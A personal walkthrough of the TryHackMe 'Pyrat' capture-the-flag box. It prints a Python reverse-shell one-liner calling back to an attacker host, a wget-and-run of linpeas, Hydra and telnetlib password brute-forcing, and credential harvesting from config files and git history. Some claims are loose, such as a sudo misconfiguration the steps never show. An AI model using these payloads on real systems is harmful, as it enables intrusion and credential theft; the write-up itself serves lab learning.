# Pyrat Challenge - TryHackMe

This document will provide a detailed and structured walkthrough of my entire process, covering each step comprehensively to ensure clarity and depth of understanding. It will outline the methodologies, tools, and techniques employed, along with any challenges encountered and the solutions implemented. 

Let's get started!

---

## Context

**Scenario:** Pyrat receives a curious response from an HTTP server, leading to a potential Python code execution vulnerability. With a carefully crafted payload, we can gain a shell on the machine. By exploring the directories, we uncover a folder containing credentials. Further investigation reveals details about an older version of the application. Using a custom script, we find a hidden endpoint and fuzz passwords to retrieve a valid credential, ultimately achieving root access.

---

## Enumeration

### **Nmap Scan**

The first step in any CTF challenge is reconnaissance. We begin with an Nmap scan:

```bash
nmap -A 10.10.16.135
```

#### **Key Findings:**
- **SSH (22/tcp) - OpenSSH 8.2p1**
- **HTTP (8000/tcp) - SimpleHTTP/0.6 Python/3.11.2**
- Various error messages hinting at Python processing issues.

Python 3.11 is known for vulnerabilities, which suggests a potential attack vector.

---

## Initial Foothold

### **Exploring Port 8000**

Browsing `http://10.10.16.135:8000` resulted in a message:

> *"Try a more basic connection!"*

This led me to try different approaches:
- **Curl requests** (`curl -v 10.10.16.135:8000`)
- **Burp Suite** for deeper analysis
- **Testing different HTTP methods**

Each returned similar errors, indicating that standard web traffic wasn’t the expected input.

### **Switching to Telnet**

Given the hint about a "basic connection," I attempted netcat:

```bash
nc 10.10.16.135 8000
```

Success! This confirmed that the service expects raw text input, which led me to test Python commands.

### **Executing Python Commands**

Testing a basic Python command:

```python
print("Hello")
```

This confirmed that user input was being evaluated as Python code. I attempted a reverse shell payload but initially failed due to syntax restrictions.

A small modification allowed me to bypass restrictions and gain a reverse shell:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
```

Listener setup:

```bash
nc -lvnp 4444
```

Shell acquired!

---

## Privilege Escalation

### **Enumerating Users and Files**

Inside the shell, checking available users:

```bash
ls /home
```

Restricted access prevented me from accessing user directories directly. However, using `cd /home` instead of staying in `/root` allowed me to explore further.

### **Using LinPEAS for Automated Enumeration**

```bash
wget http://<attack-machine-ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Key Finding:
- **/opt/.git/** - Contains an old version of the application.
- **Possible credential leaks.**

### **Extracting Credentials**

Searching for potential credential storage:

```bash
find /opt -iname "*cred*" 2>/dev/null
```
```bash
find /opt -iname "*config*" 2>/dev/null
```
Found a config file containg credentials for github user Think.
Tried access ssh connection using the credentials.
```bash
ssh "think"@ip
```
Got a shell connection to user Think with user.txt in the directory with the flag.


Also, Found a `.git` folder! Listing commits revealed `pyrat.py.old`, an earlier version of the application.

```bash
git log --oneline
```

Restoring the file:

```bash
git checkout pyrat.py.old
```

Reading through it, I found a hardcoded admin endpoint and password function.

---

## Gaining Root Access

### **Password Fuzzing**

Given the admin endpoint, I attempted manual authentication but failed. A custom script was needed.

Using Hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.16.135 -s 8000 http-post-form "/admin:username=admin&password=^PASS^:Incorrect password"
```

After several failed attempts, adjusting the script for Telnet interaction was necessary. Writing a custom Python brute-forcer:

```python
import telnetlib

host = "10.10.16.135"
user = "admin"
passwords = ["password1", "password2", "supersecure"]

tn = telnetlib.Telnet(host, 8000)

tn.read_until(b"login:")
tn.write(user.encode("ascii") + b"\n")

for password in passwords:
    tn.write(password.encode("ascii") + b"\n")
    response = tn.read_until(b"Incorrect password", timeout=2)
    if b"Welcome" in response:
        print(f"Password found: {password}")
        break

tn.close()
```

Eventually, a valid password was found, allowing shell access with root priveledge and root.txt file in the directory contaning the flag.

---

## **Summary**

### **Findings:**
- Python-based Telnet server vulnerable to command injection
- Hardcoded admin credentials in old `.git` history
- Brute-force attack via Telnet to uncover password
- Misconfigured `sudo` permissions for root escalation

### **Lessons Learned:**
- Always enumerate all ports (`nmap` caught port 8000, which was key)
- Checking `.git` history can reveal sensitive data
- Automating tasks (brute-force via script) speeds up exploitation

Root flag retrieved. Challenge completed!

---

## **Closing Thoughts**

This CTF was a great example of real-world misconfigurations that attackers can exploit. Python command injection, exposed `.git` folders, and improper `sudo` configurations are common vulnerabilities. Writing this walkthrough reinforced key penetration testing skills and debugging strategies.

On to the next challenge!

